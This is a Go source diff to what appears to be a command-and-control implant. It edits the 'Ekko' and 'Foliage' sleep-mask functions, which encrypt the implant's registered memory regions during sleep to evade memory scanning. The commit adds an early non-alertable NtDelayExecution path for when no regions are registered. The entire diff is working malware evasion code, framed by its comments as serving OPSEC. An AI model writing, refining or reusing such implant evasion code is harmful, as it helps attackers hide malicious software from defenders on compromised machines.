@@ -157,6 +157,18 @@ func sleepMaskNoAccess(durationMs uint32) {
 // same OPSEC goal as Ekko (memory encrypted during sleep) without requiring a
 // full ROP chain or cgo callbacks.
 func sleepMaskEkko(durationMs uint32) {
+	maskRegionsMu.Lock()
+	hasRegions := len(maskRegions) > 0
+	maskRegionsMu.Unlock()
+
+	// No regions to mask — use plain non-alertable sleep so no APC can be
+	// delivered into unregistered Go runtime frames during the wait.
+	if !hasRegions {
+		delay := -int64(durationMs) * 10000
+		procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))
+		return
+	}
+
 	// Encrypt all registered regions before sleep
 	maskRegionsMu.Lock()
 	for _, r := range maskRegions {
@@ -164,9 +176,9 @@ func sleepMaskEkko(durationMs uint32) {
 	}
 	maskRegionsMu.Unlock()
 
-	// Alertable sleep via NtDelayExecution — same as default sleepMask
+	// Alertable sleep via NtDelayExecution
 	delay := -int64(durationMs) * 10000
-	procNtDelayExecution.Call(1, uintptr(unsafe.Pointer(&delay))) // Alertable=true
+	procNtDelayExecution.Call(1, uintptr(unsafe.Pointer(&delay)))
 
 	// Decrypt all registered regions after waking
 	maskRegionsMu.Lock()
@@ -183,6 +195,17 @@ func sleepMaskEkko(durationMs uint32) {
 // separate thread — the same isolation property that FOLIAGE achieves with
 // NtCreateThreadEx + NtQueueApcThread in C.
 func sleepMaskFoliage(durationMs uint32) {
+	maskRegionsMu.Lock()
+	hasRegions := len(maskRegions) > 0
+	maskRegionsMu.Unlock()
+
+	// No regions — plain non-alertable sleep avoids unnecessary goroutine spawn.
+	if !hasRegions {
+		delay := -int64(durationMs) * 10000
+		procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))
+		return
+	}
+
 	type savedProt struct {
 		base uintptr
 		size uintptr
